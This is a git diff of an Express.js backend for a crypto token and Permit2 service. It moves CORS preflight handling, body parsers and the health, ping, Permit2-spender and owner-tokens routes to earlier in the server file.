@@ -31,6 +31,15 @@ const __dirname = path.dirname(__filename);
 // ----------------- Crea app ANTES de usarla -----------------
 const app = express();
 
+
+
+// Manejo explícito de preflight requests
+app.options('*', cors());
+
+app.use(express.static(path.join(__dirname, "../public")));
+app.use(bodyParser.json({ limit: "10mb" }));
+app.use(express.urlencoded({ extended: true }));
+
 // Configuración de CORS mejorada
 app.use(cors({
   origin: ['https://frontpermi.vercel.app', 'http://localhost:3000'],
@@ -39,17 +48,28 @@ app.use(cors({
   allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
 }));
 
-// Manejo explícito de preflight requests
-app.options('*', cors());
-
 // Middleware para forzar JSON en todas las respuestas
 app.use((req, res, next) => {
   res.setHeader('Content-Type', 'application/json');
   next();
 });
 
-app.use(express.static(path.join(__dirname, "../public")));
-app.use(bodyParser.json({ limit: "10mb" }));
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.json({ 
+    status: 'OK', 
+    message: 'Backend server is running',
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime()
+  });
+});
+app.get('/ping', (req, res)=> res.json({ ok:true }));
+
+app.get('/permit2-spender', (req, res)=> res.json({ spender: PERMIT2_ADDRESS }));
+app.get('/owner-tokens', (req, res) => {
+  res.status(405).json({ error: 'Method Not Allowed. Use POST instead.' });
+});
+
 
 // ----------------- CONFIG -----------------
 const PORT = Number(process.env.PORT || 3000);
@@ -316,17 +336,6 @@ async function getTokensAllChains(owner){
 }
 
 // ----------------- EXPRESS API -----------------
-// Health check endpoint
-app.get('/health', (req, res) => {
-  res.json({ 
-    status: 'OK', 
-    message: 'Backend server is running',
-    timestamp: new Date().toISOString(),
-    uptime: process.uptime()
-  });
-});
-
-app.get('/ping', (req, res)=> res.json({ ok:true }));
 
 app.post('/wrap-info', (req, res)=>{
   try{
@@ -345,7 +354,7 @@ app.post('/wrap-info', (req, res)=>{
   }catch(e){ res.status(500).json({ error: e.message||String(e) }); }
 });
 
-app.get('/permit2-spender', (req, res)=> res.json({ spender: PERMIT2_ADDRESS }));
+
 
 app.post('/owner-tokens', async (req, res)=>{
   try{
@@ -372,9 +381,8 @@ app.post('/owner-tokens', async (req, res)=>{
   }catch(e){ console.error('/owner-tokens error', e); return res.status(500).json({ error: e.message||String(e) }); }
 });
 
-app.get('/owner-tokens', (req, res) => {
-  res.status(405).json({ error: 'Method Not Allowed. Use POST instead.' });
-});
+
+
 
 app.post('/permit-data', async (req, res)=>{
   try{
